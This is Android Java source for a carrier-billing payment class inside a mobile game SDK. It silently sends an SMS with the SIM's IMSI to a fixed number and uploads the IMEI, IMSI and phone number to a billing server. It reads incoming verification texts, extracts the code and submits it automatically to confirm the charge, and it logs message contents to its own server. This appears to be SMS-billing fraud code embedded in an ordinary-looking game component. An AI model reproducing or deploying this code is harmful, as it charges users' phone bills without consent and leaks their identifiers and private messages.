package mobi.zty.pay.sdk.zhongke;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * 中科支付管理类
 * 
 * @author Administrator
 * 
 */
public class ZhongKeInstance extends PaymentInterf {
	private static ZhongKeInstance instance;
	private Handler callBHandler = null;
	private String phoneNum;
	private String obtain_num = "106905114047";
	private String vertifyNum;
	private String cpparam = "";
	private String linkid;
	private String codeurl;

	public static ZhongKeInstance getInstance() {
		if (instance == null) {
			instance = scyMMpay();
		}
		return instance;
	}

	private static synchronized ZhongKeInstance scyMMpay() {
		if (instance == null) {
			instance = new ZhongKeInstance();
		}
		return instance;
	}

	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String exdata = (String) parameters[0];
		final int feeIndex = (Integer) parameters[1];
		Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "进入支付：", feeIndex);
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		
		final String url1 = mkInfo.payUrl1;
		final String cpid = mkInfo.spIdentify;
		final String imei = Helper.getIMEI(context);
		final String imsi = Helper.getIMSI(context);
		final String consumecode = feeInfo.payCode;
		phoneNum = GameSDK.getInstance().getPhoneNum();
		obtain_num = GameSDK.getInstance().getObtainNum();
		cpparam = feeInfo.name;
		this.vertifyNum = mkInfo.vertifyNum;
		if (phoneNum == null || phoneNum.trim().equals("")) {
			Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "去获取手机号码", feeIndex);
			Util_G.sendTextMessage(context, obtain_num, imsi, null, 0);// 发这条短信给平台  是为了获取手机号码
			Helper.httpGetPhonNum(GameSDK.getInstance().getNumUrl(), imsi, new Helper.Callback() {// 轮询我们自己服务端获取手机号码，

						@Override
						public void onResult(String info) {
							boolean SUCC =  false;
							if (info != null && !info.trim().equals("")) {
								try {
									JSONObject resut = new JSONObject(info);
									String num = resut.getString("mobile_num");
									if (num != null && !num.equals("")) {
										GameSDK.getInstance().setPhoneNum(num);
										phoneNum = num;
										SUCC = true;
										Util_G.debugE("dongma_pay1", "phoneNum->" +phoneNum);
										Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "获取手机号码成功", feeIndex);
										sendPayHttp(url1, cpid, imei, imsi,
												consumecode, exdata, feeIndex);
									}
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							
							if (!SUCC) {
								PayResultInfo info1 = new PayResultInfo();
								info1.resutCode = PayConfig.NO_PHONE_NUMBEL;
								info1.retMsg = "支付失败";
								Message message = callBHandler
										.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
								message.obj = info1;
								message.sendToTarget();
								Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "获取手机号失败", feeIndex);
							}
						}
					});
		} else {
			sendPayHttp(url1, cpid, imei, imsi, consumecode, exdata, feeIndex);
		}
	}

	private void sendPayHttp(final String url1, final String cpid,
			final String imei, final String imsi, final String consumecode,
			final String exdata, final int feeIndex) {
		new Thread(new Runnable() {

			@Override
			public void run() {
				PayResultInfo info = new PayResultInfo();
				info.index = feeIndex;
				try {
					String url = null;
					url = url1 + "?linkid=" + exdata + "&imei=" + imei
							+ "&imsi=" + imsi + "&cpid=" + cpid
							+ "&consumecode=" + consumecode + "&cpparam="
							+ cpparam + "&mobile=" + phoneNum;
					Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "执行支付:"+url, feeIndex);
					String requestResponse = HttpRequestt.get(url).body();
					boolean isSendMsg = false;
					if (requestResponse != null && requestResponse != "") {
						Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "支付响应结果："+requestResponse, feeIndex);
						JSONObject retJson = new JSONObject(requestResponse);
						int state = Helper.getJsonInt(retJson, "status");
						if (state == 0) {// 订单获取成功
							GameSDK.getInstance().getCurgGroupFeeInfo().getIntdexVerifyMap().put(feeIndex, 1);
							// {"status":0,"message":"success","linkid":"A100915210111","codeurl":"http://218.95.37.4:10901/c.aspx"}
							String message = Helper.getJsonString(retJson,
									"message");
							linkid = Helper.getJsonString(retJson, "linkid");
							codeurl = Helper.getJsonString(retJson, "codeurl");
							Util_G.debugE("zhongke_pay", "codeurl->" + codeurl
									+ "linkid->" + linkid);
							Util_G.debugE("dongma_pay", "pay_data->" + message
									+ "  feeIndex->" + feeIndex);
							isSendMsg = true;
							Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "请求验证码响应成功", feeIndex);
						}
					}
					if (!isSendMsg) {
						info.resutCode = PayConfig.SP_PAY_FAIL;
						info.retMsg = "支付失败";
						Message message = callBHandler
								.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "请求验证码响应失败", feeIndex);
						return;
					}

				} catch (Exception e) {
					info.resutCode = PayConfig.SP_PAY_EXPTION;
					info.retMsg = "支付失败";
					Message message = callBHandler
							.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					e.printStackTrace();
					Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "请求验证码响应异常："+e.getMessage(), feeIndex);
				}
			}
		}).start();
	}

	public void notifyPay(Object... parameters) {
		final int feeIndex = (Integer) parameters[0];
		final String virifyCode = (String) parameters[1];
		new Thread(new Runnable() {
			@Override
			public void run() {
				// http://218.95.37.4:10901/c.aspx?code=305481&linkid=A100915210111
				String url = codeurl + "?code=" + virifyCode + "&linkid="
						+ linkid;
				Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "提交验证码：url="+url, feeIndex);
				String requestResponse = HttpRequestt.get(url).body();
				if (requestResponse != null && requestResponse != "") {
					Util_G.debugE("zhongke_pay", "requestResponse->"
							+ requestResponse);
					Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "提交验证码响应"+requestResponse, feeIndex);
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					if (requestResponse.equals("ok")) {
						info.resutCode = PayConfig.BIIL_SUCC;
						info.retMsg = "提交验证码成功！";
					} else {
						info.resutCode = PayConfig.SP_PAY_FAIL;
						info.retMsg = "提交验证码失败";
					}
					Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, info.retMsg, feeIndex);
					Message message = callBHandler
							.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();

				}else{
					Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "提交验证码无响应", feeIndex);
				}
			}
		}).start();
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "读取到验证码短信："+content, feeIndex);
		if (sendFrom.contains(vertifyNum)) {
			Util_G.debugE("ALLPAY", "vertifyNum——》》开始读取验证码");
			int startIndex = -1;
			int endIndex = 1;
			String munber = "0123456789";
			for (int i = 0; i < content.length(); i++) {
				String cr = content.charAt(i) + "";
				if (startIndex < 0 && munber.contains(cr)) {
					startIndex = i;
				} else if (startIndex >= 0
						&& !munber.contains(cr)) {
					endIndex = i;
					if (endIndex - startIndex < 6) {
						startIndex = -1;
						continue;
					} else {
						break;
					}
				}
			}
			String  vetif_vode = content.substring(startIndex,
					endIndex);
			if (vetif_vode!=null&&!vetif_vode.equals("")) {
				Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "读取到验证码:"+vetif_vode, feeIndex);
				notifyPay(feeIndex,vetif_vode);
				Util_G.debugE("ALLPAY", "vertifyNum===》》"+vetif_vode);
			}else{
				Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "读取到验证码失败", feeIndex);
			}
		}else{
			Helper.sendPayMessageToServer(PayConfig.ZHONGKE_PAY, "验证码端口配置错误:"+sendFrom+"vertifyNum="+vertifyNum, feeIndex);
		}
		super.sendVerifyCode(parameters);
	}
}
